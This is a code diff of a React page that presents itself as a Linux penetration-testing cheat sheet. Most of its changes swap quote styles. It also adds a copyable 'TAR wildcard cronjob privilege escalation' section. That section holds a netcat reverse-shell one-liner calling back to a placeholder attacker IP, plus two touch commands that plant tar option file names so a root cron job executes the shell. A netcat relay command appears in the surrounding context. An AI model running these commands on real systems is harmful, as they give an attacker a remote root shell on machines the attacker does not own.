@@ -100,10 +100,22 @@ export default (props) => {
         "localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)",
     },
   ];
+  const wildcardPrivesc = [
+    {
+      title: ` echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip>
+        1234 >/tmp/f" > shell.sh`,
+    },
+    {
+      title: `touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"`,
+    },
+    {
+      title: ` touch "/var/www/html/--checkpoint=1"`,
+    },
+  ];
   return (
     <QueueAnim delay={300} duration={1500}>
       <Title
-        variant='Title level={3}'
+        variant="Title level={3}"
         style={{ fontWeight: "bold", margin: 15 }}
       >
         Useful Linux command for your Penetration Testing
@@ -113,7 +125,7 @@ export default (props) => {
       </Paragraph>
       <Divider dashed />
       <div
-        key='a'
+        key="a"
         style={{
           padding: 15,
         }}
@@ -129,7 +141,7 @@ export default (props) => {
       </div>
       <Divider dashed />
       <div
-        key='b'
+        key="b"
         style={{
           padding: 15,
         }}
@@ -145,7 +157,7 @@ export default (props) => {
       </div>
       <Divider dashed />
       <div
-        key='c'
+        key="c"
         style={{
           padding: 15,
         }}
@@ -160,7 +172,7 @@ export default (props) => {
         })}
       </div>
       <div
-        key='d'
+        key="d"
         style={{
           padding: 15,
         }}
@@ -177,7 +189,7 @@ export default (props) => {
       </div>
       <Divider dashed />
       <div
-        key='e'
+        key="e"
         style={{
           padding: 15,
         }}
@@ -195,7 +207,7 @@ export default (props) => {
       </div>
       <Divider dashed />
       <div
-        key='f'
+        key="f"
         style={{
           padding: 15,
         }}
@@ -211,7 +223,7 @@ export default (props) => {
       </div>
       <Divider dashed />
       <div
-        key='g'
+        key="g"
         style={{
           padding: 15,
         }}
@@ -229,13 +241,29 @@ export default (props) => {
       </div>
       <Divider dashed />
       <div
-        key='h'
+        key="h"
         style={{
           padding: 15,
         }}
       >
         <Title level={3}>How to port forwarding ?</Title>
         {PortForwarding.map((k, i) => {
+          return (
+            <Paragraph key={i} copyable>
+              {k.title}
+            </Paragraph>
+          );
+        })}
+      </div>
+      <Divider dashed />
+      <div
+        key="h"
+        style={{
+          padding: 15,
+        }}
+      >
+        <Title level={3}>TAR wildcard cronjob privilege escalation </Title>
+        {wildcardPrivesc.map((k, i) => {
           return (
             <Paragraph key={i} copyable>
               {k.title}
